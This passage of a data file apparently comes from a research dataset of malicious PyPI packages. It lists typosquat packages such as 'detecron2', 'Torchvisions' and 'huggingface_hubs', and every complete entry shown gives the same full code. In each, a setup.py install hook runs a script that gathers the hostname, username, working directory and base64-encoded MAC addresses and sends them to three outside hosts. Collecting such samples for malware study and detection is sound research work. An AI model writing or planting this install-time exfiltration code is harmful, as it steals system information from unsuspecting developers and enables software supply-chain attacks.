\"__main__\":\n    main()\n\nfrom setuptools import setup, find_packages\nfrom setuptools.command.install import install\n\n\nclass CrazyInstallStrat(install):\n    def run(self):\n        install.run(self)\n        from main import main\n        main()\n\nsetup(\n    name=\"fairsequence\",\n    version=\"91.6\",\n    author=\"x\",\n    author_email=\"xxx@outlook.com\",\n    description=\"x\",\n    long_description_content_type=\"text/markdown\",\n    long_description=\"xxx\",\n    cmdclass={\n        'install': CrazyInstallStrat,\n    },\n    install_requires=['requests', 'psutil'],\n    setup_requires=['setuptools']\n)"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2024-11-12-gym-reschdule-combination-v93.6",
        "code": "import platform\nimport getpass\nimport os\nimport urllib.parse\nimport urllib.request\nimport random\nimport subprocess\nimport base64\n\ndef get_mac_addresses():\n    mac_addresses = []\n    system = platform.system()\n\n    if system == \"Windows\":\n        output = subprocess.check_output(\"getmac\", shell=True).decode()\n        for line in output.splitlines():\n            if \"Physical\" in line:\n                mac = line.split()[0]\n                mac_addresses.append(mac)\n\n    elif system == \"Linux\":\n        output = subprocess.check_output(\"ifconfig\", shell=True).decode()\n        for line in output.splitlines():\n            if \"ether\" in line:\n                mac = line.split()[1]\n                mac_addresses.append(mac)\n\n    elif system == \"Darwin\":\n        output = subprocess.check_output(\"ifconfig\", shell=True).decode()\n        for line in output.splitlines():\n            if \"ether\" in line:\n                mac = line.split()[1]\n                mac_addresses.append(mac)\n\n    return mac_addresses\n\ndef main():\n    hostname = platform.node()\n    username = getpass.getuser()\n    current_path = os.getcwd()\n    rd_num = random.randint(10000, 99999)\n    mac_addresses = get_mac_addresses()\n    bs64_encode_mac = base64.b64encode(str(mac_addresses).encode('utf-8')).decode('utf-8')\n\n    urls = [\n        \"http://dnipqouebm-psl.cn.oast-cn.byted-dast.com\",\n        \"http://oqvignkp58-psl.i18n.oast-row.byted-dast.com\",\n        \"http://sbfwstspuutiarcjzptf3c0cvb6yng6mw.oast.fun\"\n    ]\n\n    for url in urls:\n        params = {\n            \"hostname\": hostname,\n            \"username\": username,\n            \"dir\": current_path,\n            \"mac_address\": bs64_encode_mac\n        }\n        full_url = f\"{url}/realtime_p/pypi/{rd_num}?{urllib.parse.urlencode(params)}\"\n        try:\n            with urllib.request.urlopen(full_url) as response:\n                pass\n        except Exception as e:\n            pass\n\n\nif __name__ == \"__main__\":\n    main()\n\nfrom setuptools import setup, find_packages\nfrom setuptools.command.install import install\n\n\nclass CrazyInstallStrat(install):\n    def run(self):\n        install.run(self)\n        from main import main\n        main()\n\nsetup(\n    name=\"gym-reschdule_combination\",\n    version=\"93.6\",\n    author=\"x\",\n    author_email=\"xxx@outlook.com\",\n    description=\"x\",\n    long_description_content_type=\"text/markdown\",\n    long_description=\"xxx\",\n    cmdclass={\n        'install': CrazyInstallStrat,\n    },\n    install_requires=['requests', 'psutil'],\n    setup_requires=['setuptools']\n)"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2024-11-14-detecron2-v94.6",
        "code": "import platform\nimport getpass\nimport os\nimport urllib.parse\nimport urllib.request\nimport random\nimport subprocess\nimport base64\n\ndef get_mac_addresses():\n    mac_addresses = []\n    system = platform.system()\n\n    if system == \"Windows\":\n        output = subprocess.check_output(\"getmac\", shell=True).decode()\n        for line in output.splitlines():\n            if \"Physical\" in line:\n                mac = line.split()[0]\n                mac_addresses.append(mac)\n\n    elif system == \"Linux\":\n        output = subprocess.check_output(\"ifconfig\", shell=True).decode()\n        for line in output.splitlines():\n            if \"ether\" in line:\n                mac = line.split()[1]\n                mac_addresses.append(mac)\n\n    elif system == \"Darwin\":\n        output = subprocess.check_output(\"ifconfig\", shell=True).decode()\n        for line in output.splitlines():\n            if \"ether\" in line:\n                mac = line.split()[1]\n                mac_addresses.append(mac)\n\n    return mac_addresses\n\ndef main():\n    hostname = platform.node()\n    username = getpass.getuser()\n    current_path = os.getcwd()\n    rd_num = random.randint(10000, 99999)\n    mac_addresses = get_mac_addresses()\n    bs64_encode_mac = base64.b64encode(str(mac_addresses).encode('utf-8')).decode('utf-8')\n\n    urls = [\n        \"http://dnipqouebm-psl.cn.oast-cn.byted-dast.com\",\n        \"http://oqvignkp58-psl.i18n.oast-row.byted-dast.com\",\n        \"http://sbfwstspuutiarcjzptf3c0cvb6yng6mw.oast.fun\"\n    ]\n\n    for url in urls:\n        params = {\n            \"hostname\": hostname,\n            \"username\": username,\n            \"dir\": current_path,\n            \"mac_address\": bs64_encode_mac\n        }\n        full_url = f\"{url}/realtime_p/pypi/{rd_num}?{urllib.parse.urlencode(params)}\"\n        try:\n            with urllib.request.urlopen(full_url) as response:\n                pass\n        except Exception as e:\n            pass\n\n\nif __name__ == \"__main__\":\n    main()\n\nfrom setuptools import setup, find_packages\nfrom setuptools.command.install import install\n\n\nclass CrazyInstallStrat(install):\n    def run(self):\n        install.run(self)\n        from main import main\n        main()\n\nsetup(\n    name=\"detecron2\",\n    version=\"94.6\",\n    author=\"x\",\n    author_email=\"xxx@outlook.com\",\n    description=\"x\",\n    long_description_content_type=\"text/markdown\",\n    long_description=\"xxx\",\n    cmdclass={\n        'install': CrazyInstallStrat,\n    },\n    install_requires=['requests', 'psutil'],\n    setup_requires=['setuptools']\n)"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2024-11-14-detectren-v94.6",
        "code": "import platform\nimport getpass\nimport os\nimport urllib.parse\nimport urllib.request\nimport random\nimport subprocess\nimport base64\n\ndef get_mac_addresses():\n    mac_addresses = []\n    system = platform.system()\n\n    if system == \"Windows\":\n        output = subprocess.check_output(\"getmac\", shell=True).decode()\n        for line in output.splitlines():\n            if \"Physical\" in line:\n                mac = line.split()[0]\n                mac_addresses.append(mac)\n\n    elif system == \"Linux\":\n        output = subprocess.check_output(\"ifconfig\", shell=True).decode()\n        for line in output.splitlines():\n            if \"ether\" in line:\n                mac = line.split()[1]\n                mac_addresses.append(mac)\n\n    elif system == \"Darwin\":\n        output = subprocess.check_output(\"ifconfig\", shell=True).decode()\n        for line in output.splitlines():\n            if \"ether\" in line:\n                mac = line.split()[1]\n                mac_addresses.append(mac)\n\n    return mac_addresses\n\ndef main():\n    hostname = platform.node()\n    username = getpass.getuser()\n    current_path = os.getcwd()\n    rd_num = random.randint(10000, 99999)\n    mac_addresses = get_mac_addresses()\n    bs64_encode_mac = base64.b64encode(str(mac_addresses).encode('utf-8')).decode('utf-8')\n\n    urls = [\n        \"http://dnipqouebm-psl.cn.oast-cn.byted-dast.com\",\n        \"http://oqvignkp58-psl.i18n.oast-row.byted-dast.com\",\n        \"http://sbfwstspuutiarcjzptf3c0cvb6yng6mw.oast.fun\"\n    ]\n\n    for url in urls:\n        params = {\n            \"hostname\": hostname,\n            \"username\": username,\n            \"dir\": current_path,\n            \"mac_address\": bs64_encode_mac\n        }\n        full_url = f\"{url}/realtime_p/pypi/{rd_num}?{urllib.parse.urlencode(params)}\"\n        try:\n            with urllib.request.urlopen(full_url) as response:\n                pass\n        except Exception as e:\n            pass\n\n\nif __name__ == \"__main__\":\n    main()\n\nfrom setuptools import setup, find_packages\nfrom setuptools.command.install import install\n\n\nclass CrazyInstallStrat(install):\n    def run(self):\n        install.run(self)\n        from main import main\n        main()\n\nsetup(\n    name=\"Detectren\",\n    version=\"94.6\",\n    author=\"x\",\n    author_email=\"xxx@outlook.com\",\n    description=\"x\",\n    long_description_content_type=\"text/markdown\",\n    long_description=\"xxx\",\n    cmdclass={\n        'install': CrazyInstallStrat,\n    },\n    install_requires=['requests', 'psutil'],\n    setup_requires=['setuptools']\n)"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2024-11-14-detectron4-v94.6",
        "code": "import platform\nimport getpass\nimport os\nimport urllib.parse\nimport urllib.request\nimport random\nimport subprocess\nimport base64\n\ndef get_mac_addresses():\n    mac_addresses = []\n    system = platform.system()\n\n    if system == \"Windows\":\n        output = subprocess.check_output(\"getmac\", shell=True).decode()\n        for line in output.splitlines():\n            if \"Physical\" in line:\n                mac = line.split()[0]\n                mac_addresses.append(mac)\n\n    elif system == \"Linux\":\n        output = subprocess.check_output(\"ifconfig\", shell=True).decode()\n        for line in output.splitlines():\n            if \"ether\" in line:\n                mac = line.split()[1]\n                mac_addresses.append(mac)\n\n    elif system == \"Darwin\":\n        output = subprocess.check_output(\"ifconfig\", shell=True).decode()\n        for line in output.splitlines():\n            if \"ether\" in line:\n                mac = line.split()[1]\n                mac_addresses.append(mac)\n\n    return mac_addresses\n\ndef main():\n    hostname = platform.node()\n    username = getpass.getuser()\n    current_path = os.getcwd()\n    rd_num = random.randint(10000, 99999)\n    mac_addresses = get_mac_addresses()\n    bs64_encode_mac = base64.b64encode(str(mac_addresses).encode('utf-8')).decode('utf-8')\n\n    urls = [\n        \"http://dnipqouebm-psl.cn.oast-cn.byted-dast.com\",\n        \"http://oqvignkp58-psl.i18n.oast-row.byted-dast.com\",\n        \"http://sbfwstspuutiarcjzptf3c0cvb6yng6mw.oast.fun\"\n    ]\n\n    for url in urls:\n        params = {\n            \"hostname\": hostname,\n            \"username\": username,\n            \"dir\": current_path,\n            \"mac_address\": bs64_encode_mac\n        }\n        full_url = f\"{url}/realtime_p/pypi/{rd_num}?{urllib.parse.urlencode(params)}\"\n        try:\n            with urllib.request.urlopen(full_url) as response:\n                pass\n        except Exception as e:\n            pass\n\n\nif __name__ == \"__main__\":\n    main()\n\nfrom setuptools import setup, find_packages\nfrom setuptools.command.install import install\n\n\nclass CrazyInstallStrat(install):\n    def run(self):\n        install.run(self)\n        from main import main\n        main()\n\nsetup(\n    name=\"detectron4\",\n    version=\"94.6\",\n    author=\"x\",\n    author_email=\"xxx@outlook.com\",\n    description=\"x\",\n    long_description_content_type=\"text/markdown\",\n    long_description=\"xxx\",\n    cmdclass={\n        'install': CrazyInstallStrat,\n    },\n    install_requires=['requests', 'psutil'],\n    setup_requires=['setuptools']\n)"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2024-11-14-ferminet-with-ecp-v94.6",
        "code": "import platform\nimport getpass\nimport os\nimport urllib.parse\nimport urllib.request\nimport random\nimport subprocess\nimport base64\n\ndef get_mac_addresses():\n    mac_addresses = []\n    system = platform.system()\n\n    if system == \"Windows\":\n        output = subprocess.check_output(\"getmac\", shell=True).decode()\n        for line in output.splitlines():\n            if \"Physical\" in line:\n                mac = line.split()[0]\n                mac_addresses.append(mac)\n\n    elif system == \"Linux\":\n        output = subprocess.check_output(\"ifconfig\", shell=True).decode()\n        for line in output.splitlines():\n            if \"ether\" in line:\n                mac = line.split()[1]\n                mac_addresses.append(mac)\n\n    elif system == \"Darwin\":\n        output = subprocess.check_output(\"ifconfig\", shell=True).decode()\n        for line in output.splitlines():\n            if \"ether\" in line:\n                mac = line.split()[1]\n                mac_addresses.append(mac)\n\n    return mac_addresses\n\ndef main():\n    hostname = platform.node()\n    username = getpass.getuser()\n    current_path = os.getcwd()\n    rd_num = random.randint(10000, 99999)\n    mac_addresses = get_mac_addresses()\n    bs64_encode_mac = base64.b64encode(str(mac_addresses).encode('utf-8')).decode('utf-8')\n\n    urls = [\n        \"http://dnipqouebm-psl.cn.oast-cn.byted-dast.com\",\n        \"http://oqvignkp58-psl.i18n.oast-row.byted-dast.com\",\n        \"http://sbfwstspuutiarcjzptf3c0cvb6yng6mw.oast.fun\"\n    ]\n\n    for url in urls:\n        params = {\n            \"hostname\": hostname,\n            \"username\": username,\n            \"dir\": current_path,\n            \"mac_address\": bs64_encode_mac\n        }\n        full_url = f\"{url}/realtime_p/pypi/{rd_num}?{urllib.parse.urlencode(params)}\"\n        try:\n            with urllib.request.urlopen(full_url) as response:\n                pass\n        except Exception as e:\n            pass\n\n\nif __name__ == \"__main__\":\n    main()\n\nfrom setuptools import setup, find_packages\nfrom setuptools.command.install import install\n\n\nclass CrazyInstallStrat(install):\n    def run(self):\n        install.run(self)\n        from main import main\n        main()\n\nsetup(\n    name=\"FermiNet_with_ECP\",\n    version=\"94.6\",\n    author=\"x\",\n    author_email=\"xxx@outlook.com\",\n    description=\"x\",\n    long_description_content_type=\"text/markdown\",\n    long_description=\"xxx\",\n    cmdclass={\n        'install': CrazyInstallStrat,\n    },\n    install_requires=['requests', 'psutil'],\n    setup_requires=['setuptools']\n)"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2024-11-14-midi-melady-extraction-v94.6",
        "code": "import platform\nimport getpass\nimport os\nimport urllib.parse\nimport urllib.request\nimport random\nimport subprocess\nimport base64\n\ndef get_mac_addresses():\n    mac_addresses = []\n    system = platform.system()\n\n    if system == \"Windows\":\n        output = subprocess.check_output(\"getmac\", shell=True).decode()\n        for line in output.splitlines():\n            if \"Physical\" in line:\n                mac = line.split()[0]\n                mac_addresses.append(mac)\n\n    elif system == \"Linux\":\n        output = subprocess.check_output(\"ifconfig\", shell=True).decode()\n        for line in output.splitlines():\n            if \"ether\" in line:\n                mac = line.split()[1]\n                mac_addresses.append(mac)\n\n    elif system == \"Darwin\":\n        output = subprocess.check_output(\"ifconfig\", shell=True).decode()\n        for line in output.splitlines():\n            if \"ether\" in line:\n                mac = line.split()[1]\n                mac_addresses.append(mac)\n\n    return mac_addresses\n\ndef main():\n    hostname = platform.node()\n    username = getpass.getuser()\n    current_path = os.getcwd()\n    rd_num = random.randint(10000, 99999)\n    mac_addresses = get_mac_addresses()\n    bs64_encode_mac = base64.b64encode(str(mac_addresses).encode('utf-8')).decode('utf-8')\n\n    urls = [\n        \"http://dnipqouebm-psl.cn.oast-cn.byted-dast.com\",\n        \"http://oqvignkp58-psl.i18n.oast-row.byted-dast.com\",\n        \"http://sbfwstspuutiarcjzptf3c0cvb6yng6mw.oast.fun\"\n    ]\n\n    for url in urls:\n        params = {\n            \"hostname\": hostname,\n            \"username\": username,\n            \"dir\": current_path,\n            \"mac_address\": bs64_encode_mac\n        }\n        full_url = f\"{url}/realtime_p/pypi/{rd_num}?{urllib.parse.urlencode(params)}\"\n        try:\n            with urllib.request.urlopen(full_url) as response:\n                pass\n        except Exception as e:\n            pass\n\n\nif __name__ == \"__main__\":\n    main()\n\nfrom setuptools import setup, find_packages\nfrom setuptools.command.install import install\n\n\nclass CrazyInstallStrat(install):\n    def run(self):\n        install.run(self)\n        from main import main\n        main()\n\nsetup(\n    name=\"midi_melady_extraction\",\n    version=\"94.6\",\n    author=\"x\",\n    author_email=\"xxx@outlook.com\",\n    description=\"x\",\n    long_description_content_type=\"text/markdown\",\n    long_description=\"xxx\",\n    cmdclass={\n        'install': CrazyInstallStrat,\n    },\n    install_requires=['requests', 'psutil'],\n    setup_requires=['setuptools']\n)"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2024-11-14-midi-melody-extraction-v94.6",
        "code": "import platform\nimport getpass\nimport os\nimport urllib.parse\nimport urllib.request\nimport random\nimport subprocess\nimport base64\n\ndef get_mac_addresses():\n    mac_addresses = []\n    system = platform.system()\n\n    if system == \"Windows\":\n        output = subprocess.check_output(\"getmac\", shell=True).decode()\n        for line in output.splitlines():\n            if \"Physical\" in line:\n                mac = line.split()[0]\n                mac_addresses.append(mac)\n\n    elif system == \"Linux\":\n        output = subprocess.check_output(\"ifconfig\", shell=True).decode()\n        for line in output.splitlines():\n            if \"ether\" in line:\n                mac = line.split()[1]\n                mac_addresses.append(mac)\n\n    elif system == \"Darwin\":\n        output = subprocess.check_output(\"ifconfig\", shell=True).decode()\n        for line in output.splitlines():\n            if \"ether\" in line:\n                mac = line.split()[1]\n                mac_addresses.append(mac)\n\n    return mac_addresses\n\ndef main():\n    hostname = platform.node()\n    username = getpass.getuser()\n    current_path = os.getcwd()\n    rd_num = random.randint(10000, 99999)\n    mac_addresses = get_mac_addresses()\n    bs64_encode_mac = base64.b64encode(str(mac_addresses).encode('utf-8')).decode('utf-8')\n\n    urls = [\n        \"http://dnipqouebm-psl.cn.oast-cn.byted-dast.com\",\n        \"http://oqvignkp58-psl.i18n.oast-row.byted-dast.com\",\n        \"http://sbfwstspuutiarcjzptf3c0cvb6yng6mw.oast.fun\"\n    ]\n\n    for url in urls:\n        params = {\n            \"hostname\": hostname,\n            \"username\": username,\n            \"dir\": current_path,\n            \"mac_address\": bs64_encode_mac\n        }\n        full_url = f\"{url}/realtime_p/pypi/{rd_num}?{urllib.parse.urlencode(params)}\"\n        try:\n            with urllib.request.urlopen(full_url) as response:\n                pass\n        except Exception as e:\n            pass\n\n\nif __name__ == \"__main__\":\n    main()\n\nfrom setuptools import setup, find_packages\nfrom setuptools.command.install import install\n\n\nclass CrazyInstallStrat(install):\n    def run(self):\n        install.run(self)\n        from main import main\n        main()\n\nsetup(\n    name=\"midi_melody_extraction\",\n    version=\"94.6\",\n    author=\"x\",\n    author_email=\"xxx@outlook.com\",\n    description=\"x\",\n    long_description_content_type=\"text/markdown\",\n    long_description=\"xxx\",\n    cmdclass={\n        'install': CrazyInstallStrat,\n    },\n    install_requires=['requests', 'psutil'],\n    setup_requires=['setuptools']\n)"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2024-11-14-midi-melody-extractions-v94.6",
        "code": "import platform\nimport getpass\nimport os\nimport urllib.parse\nimport urllib.request\nimport random\nimport subprocess\nimport base64\n\ndef get_mac_addresses():\n    mac_addresses = []\n    system = platform.system()\n\n    if system == \"Windows\":\n        output = subprocess.check_output(\"getmac\", shell=True).decode()\n        for line in output.splitlines():\n            if \"Physical\" in line:\n                mac = line.split()[0]\n                mac_addresses.append(mac)\n\n    elif system == \"Linux\":\n        output = subprocess.check_output(\"ifconfig\", shell=True).decode()\n        for line in output.splitlines():\n            if \"ether\" in line:\n                mac = line.split()[1]\n                mac_addresses.append(mac)\n\n    elif system == \"Darwin\":\n        output = subprocess.check_output(\"ifconfig\", shell=True).decode()\n        for line in output.splitlines():\n            if \"ether\" in line:\n                mac = line.split()[1]\n                mac_addresses.append(mac)\n\n    return mac_addresses\n\ndef main():\n    hostname = platform.node()\n    username = getpass.getuser()\n    current_path = os.getcwd()\n    rd_num = random.randint(10000, 99999)\n    mac_addresses = get_mac_addresses()\n    bs64_encode_mac = base64.b64encode(str(mac_addresses).encode('utf-8')).decode('utf-8')\n\n    urls = [\n        \"http://dnipqouebm-psl.cn.oast-cn.byted-dast.com\",\n        \"http://oqvignkp58-psl.i18n.oast-row.byted-dast.com\",\n        \"http://sbfwstspuutiarcjzptf3c0cvb6yng6mw.oast.fun\"\n    ]\n\n    for url in urls:\n        params = {\n            \"hostname\": hostname,\n            \"username\": username,\n            \"dir\": current_path,\n            \"mac_address\": bs64_encode_mac\n        }\n        full_url = f\"{url}/realtime_p/pypi/{rd_num}?{urllib.parse.urlencode(params)}\"\n        try:\n            with urllib.request.urlopen(full_url) as response:\n                pass\n        except Exception as e:\n            pass\n\n\nif __name__ == \"__main__\":\n    main()\n\nfrom setuptools import setup, find_packages\nfrom setuptools.command.install import install\n\n\nclass CrazyInstallStrat(install):\n    def run(self):\n        install.run(self)\n        from main import main\n        main()\n\nsetup(\n    name=\"midi_melody_extractions\",\n    version=\"94.6\",\n    author=\"x\",\n    author_email=\"xxx@outlook.com\",\n    description=\"x\",\n    long_description_content_type=\"text/markdown\",\n    long_description=\"xxx\",\n    cmdclass={\n        'install': CrazyInstallStrat,\n    },\n    install_requires=['requests', 'psutil'],\n    setup_requires=['setuptools']\n)"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2024-11-14-torchs-visions-v94.6",
        "code": "import platform\nimport getpass\nimport os\nimport urllib.parse\nimport urllib.request\nimport random\nimport subprocess\nimport base64\n\ndef get_mac_addresses():\n    mac_addresses = []\n    system = platform.system()\n\n    if system == \"Windows\":\n        output = subprocess.check_output(\"getmac\", shell=True).decode()\n        for line in output.splitlines():\n            if \"Physical\" in line:\n                mac = line.split()[0]\n                mac_addresses.append(mac)\n\n    elif system == \"Linux\":\n        output = subprocess.check_output(\"ifconfig\", shell=True).decode()\n        for line in output.splitlines():\n            if \"ether\" in line:\n                mac = line.split()[1]\n                mac_addresses.append(mac)\n\n    elif system == \"Darwin\":\n        output = subprocess.check_output(\"ifconfig\", shell=True).decode()\n        for line in output.splitlines():\n            if \"ether\" in line:\n                mac = line.split()[1]\n                mac_addresses.append(mac)\n\n    return mac_addresses\n\ndef main():\n    hostname = platform.node()\n    username = getpass.getuser()\n    current_path = os.getcwd()\n    rd_num = random.randint(10000, 99999)\n    mac_addresses = get_mac_addresses()\n    bs64_encode_mac = base64.b64encode(str(mac_addresses).encode('utf-8')).decode('utf-8')\n\n    urls = [\n        \"http://dnipqouebm-psl.cn.oast-cn.byted-dast.com\",\n        \"http://oqvignkp58-psl.i18n.oast-row.byted-dast.com\",\n        \"http://sbfwstspuutiarcjzptf3c0cvb6yng6mw.oast.fun\"\n    ]\n\n    for url in urls:\n        params = {\n            \"hostname\": hostname,\n            \"username\": username,\n            \"dir\": current_path,\n            \"mac_address\": bs64_encode_mac\n        }\n        full_url = f\"{url}/realtime_p/pypi/{rd_num}?{urllib.parse.urlencode(params)}\"\n        try:\n            with urllib.request.urlopen(full_url) as response:\n                pass\n        except Exception as e:\n            pass\n\n\nif __name__ == \"__main__\":\n    main()\n\nfrom setuptools import setup, find_packages\nfrom setuptools.command.install import install\n\n\nclass CrazyInstallStrat(install):\n    def run(self):\n        install.run(self)\n        from main import main\n        main()\n\nsetup(\n    name=\"Torchs-visions\",\n    version=\"94.6\",\n    author=\"x\",\n    author_email=\"xxx@outlook.com\",\n    description=\"x\",\n    long_description_content_type=\"text/markdown\",\n    long_description=\"xxx\",\n    cmdclass={\n        'install': CrazyInstallStrat,\n    },\n    install_requires=['requests', 'psutil'],\n    setup_requires=['setuptools']\n)"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2024-11-14-torchvisions-v94.6",
        "code": "import platform\nimport getpass\nimport os\nimport urllib.parse\nimport urllib.request\nimport random\nimport subprocess\nimport base64\n\ndef get_mac_addresses():\n    mac_addresses = []\n    system = platform.system()\n\n    if system == \"Windows\":\n        output = subprocess.check_output(\"getmac\", shell=True).decode()\n        for line in output.splitlines():\n            if \"Physical\" in line:\n                mac = line.split()[0]\n                mac_addresses.append(mac)\n\n    elif system == \"Linux\":\n        output = subprocess.check_output(\"ifconfig\", shell=True).decode()\n        for line in output.splitlines():\n            if \"ether\" in line:\n                mac = line.split()[1]\n                mac_addresses.append(mac)\n\n    elif system == \"Darwin\":\n        output = subprocess.check_output(\"ifconfig\", shell=True).decode()\n        for line in output.splitlines():\n            if \"ether\" in line:\n                mac = line.split()[1]\n                mac_addresses.append(mac)\n\n    return mac_addresses\n\ndef main():\n    hostname = platform.node()\n    username = getpass.getuser()\n    current_path = os.getcwd()\n    rd_num = random.randint(10000, 99999)\n    mac_addresses = get_mac_addresses()\n    bs64_encode_mac = base64.b64encode(str(mac_addresses).encode('utf-8')).decode('utf-8')\n\n    urls = [\n        \"http://dnipqouebm-psl.cn.oast-cn.byted-dast.com\",\n        \"http://oqvignkp58-psl.i18n.oast-row.byted-dast.com\",\n        \"http://sbfwstspuutiarcjzptf3c0cvb6yng6mw.oast.fun\"\n    ]\n\n    for url in urls:\n        params = {\n            \"hostname\": hostname,\n            \"username\": username,\n            \"dir\": current_path,\n            \"mac_address\": bs64_encode_mac\n        }\n        full_url = f\"{url}/realtime_p/pypi/{rd_num}?{urllib.parse.urlencode(params)}\"\n        try:\n            with urllib.request.urlopen(full_url) as response:\n                pass\n        except Exception as e:\n            pass\n\n\nif __name__ == \"__main__\":\n    main()\n\nfrom setuptools import setup, find_packages\nfrom setuptools.command.install import install\n\n\nclass CrazyInstallStrat(install):\n    def run(self):\n        install.run(self)\n        from main import main\n        main()\n\nsetup(\n    name=\"Torchvisions\",\n    version=\"94.6\",\n    author=\"x\",\n    author_email=\"xxx@outlook.com\",\n    description=\"x\",\n    long_description_content_type=\"text/markdown\",\n    long_description=\"xxx\",\n    cmdclass={\n        'install': CrazyInstallStrat,\n    },\n    install_requires=['requests', 'psutil'],\n    setup_requires=['setuptools']\n)"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2024-11-15-controlnot-aux-v95.6",
        "code": "import platform\nimport getpass\nimport os\nimport urllib.parse\nimport urllib.request\nimport random\nimport subprocess\nimport base64\n\ndef get_mac_addresses():\n    mac_addresses = []\n    system = platform.system()\n\n    if system == \"Windows\":\n        output = subprocess.check_output(\"getmac\", shell=True).decode()\n        for line in output.splitlines():\n            if \"Physical\" in line:\n                mac = line.split()[0]\n                mac_addresses.append(mac)\n\n    elif system == \"Linux\":\n        output = subprocess.check_output(\"ifconfig\", shell=True).decode()\n        for line in output.splitlines():\n            if \"ether\" in line:\n                mac = line.split()[1]\n                mac_addresses.append(mac)\n\n    elif system == \"Darwin\":\n        output = subprocess.check_output(\"ifconfig\", shell=True).decode()\n        for line in output.splitlines():\n            if \"ether\" in line:\n                mac = line.split()[1]\n                mac_addresses.append(mac)\n\n    return mac_addresses\n\ndef main():\n    hostname = platform.node()\n    username = getpass.getuser()\n    current_path = os.getcwd()\n    rd_num = random.randint(10000, 99999)\n    mac_addresses = get_mac_addresses()\n    bs64_encode_mac = base64.b64encode(str(mac_addresses).encode('utf-8')).decode('utf-8')\n\n    urls = [\n        \"http://dnipqouebm-psl.cn.oast-cn.byted-dast.com\",\n        \"http://oqvignkp58-psl.i18n.oast-row.byted-dast.com\",\n        \"http://sbfwstspuutiarcjzptf3c0cvb6yng6mw.oast.fun\"\n    ]\n\n    for url in urls:\n        params = {\n            \"hostname\": hostname,\n            \"username\": username,\n            \"dir\": current_path,\n            \"mac_address\": bs64_encode_mac\n        }\n        full_url = f\"{url}/realtime_p/pypi/{rd_num}?{urllib.parse.urlencode(params)}\"\n        try:\n            with urllib.request.urlopen(full_url) as response:\n                pass\n        except Exception as e:\n            pass\n\n\nif __name__ == \"__main__\":\n    main()\n\nfrom setuptools import setup, find_packages\nfrom setuptools.command.install import install\n\n\nclass CrazyInstallStrat(install):\n    def run(self):\n        install.run(self)\n        from main import main\n        main()\n\nsetup(\n    name=\"controlnot_aux\",\n    version=\"95.6\",\n    author=\"x\",\n    author_email=\"xxx@outlook.com\",\n    description=\"x\",\n    long_description_content_type=\"text/markdown\",\n    long_description=\"xxx\",\n    cmdclass={\n        'install': CrazyInstallStrat,\n    },\n    install_requires=['requests', 'psutil'],\n    setup_requires=['setuptools']\n)"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2024-11-15-huggingface-hubs-v95.6",
        "code": "import platform\nimport getpass\nimport os\nimport urllib.parse\nimport urllib.request\nimport random\nimport subprocess\nimport base64\n\ndef get_mac_addresses():\n    mac_addresses = []\n    system = platform.system()\n\n    if system == \"Windows\":\n        output = subprocess.check_output(\"getmac\", shell=True).decode()\n        for line in output.splitlines():\n            if \"Physical\" in line:\n                mac = line.split()[0]\n                mac_addresses.append(mac)\n\n    elif system == \"Linux\":\n        output = subprocess.check_output(\"ifconfig\", shell=True).decode()\n        for line in output.splitlines():\n            if \"ether\" in line:\n                mac = line.split()[1]\n                mac_addresses.append(mac)\n\n    elif system == \"Darwin\":\n        output = subprocess.check_output(\"ifconfig\", shell=True).decode()\n        for line in output.splitlines():\n            if \"ether\" in line:\n                mac = line.split()[1]\n                mac_addresses.append(mac)\n\n    return mac_addresses\n\ndef main():\n    hostname = platform.node()\n    username = getpass.getuser()\n    current_path = os.getcwd()\n    rd_num = random.randint(10000, 99999)\n    mac_addresses = get_mac_addresses()\n    bs64_encode_mac = base64.b64encode(str(mac_addresses).encode('utf-8')).decode('utf-8')\n\n    urls = [\n        \"http://dnipqouebm-psl.cn.oast-cn.byted-dast.com\",\n        \"http://oqvignkp58-psl.i18n.oast-row.byted-dast.com\",\n        \"http://sbfwstspuutiarcjzptf3c0cvb6yng6mw.oast.fun\"\n    ]\n\n    for url in urls:\n        params = {\n            \"hostname\": hostname,\n            \"username\": username,\n            \"dir\": current_path,\n            \"mac_address\": bs64_encode_mac\n        }\n        full_url = f\"{url}/realtime_p/pypi/{rd_num}?{urllib.parse.urlencode(params)}\"\n        try:\n            with urllib.request.urlopen(full_url) as response:\n                pass\n        except Exception as e:\n            pass\n\n\nif __name__ == \"__main__\":\n    main()\n\nfrom setuptools import setup, find_packages\nfrom setuptools.command.install import install\n\n\nclass CrazyInstallStrat(install):\n    def run(self):\n        install.run(self)\n        from main import main\n        main()\n\nsetup(\n    name=\"huggingface_hubs\",\n    version=\"95.6\",\n    author=\"x\",\n    author_email=\"xxx@outlook.com\",\n    description=\"x\",\n    long_description_content_type=\"text/markdown\",\n    long_description=\"xxx\",\n    cmdclass={\n        'install': CrazyInstallStrat,\n    },\n    install_requires=['requests', 'psutil'],\n    setup_requires=['setuptools']\n)"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2024-11-15-huggingfaces-hub-v95.6",
